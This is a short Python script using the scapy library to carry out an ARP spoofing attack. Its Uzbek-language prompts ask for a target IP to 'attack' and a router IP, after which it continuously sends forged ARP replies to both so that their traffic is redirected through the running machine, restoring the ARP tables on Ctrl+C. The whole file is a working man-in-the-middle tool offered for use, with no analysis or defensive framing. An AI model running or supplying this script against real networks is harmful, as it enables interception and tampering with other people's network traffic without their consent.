import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(target_ip2, spoof_ip2):
    target_mac2 = get_mac(target_ip2)
    spoof_mac = get_mac(spoof_ip2)
    packet = scapy.ARP(op=2, pdst=target_ip2, hwdst=target_mac2, psrc=spoof_ip2, hwsrc=spoof_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = input("ATTACK Qilinadigan IP ni yozing = ")
gateway_ip = input("ROUTER IP sini yozing = ")

# if not gateway_ip:
#     gateway_ip("Iltimos ip kiriitng")

try:
    sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_count = sent_count + 2
        print("\r[+] Paketlar soni: " + str(sent_count) + "ta", end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nCTRL+C bosildi. Dasturdan chiqdik. IP va MAC manzillar joyiga qaytarildi.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
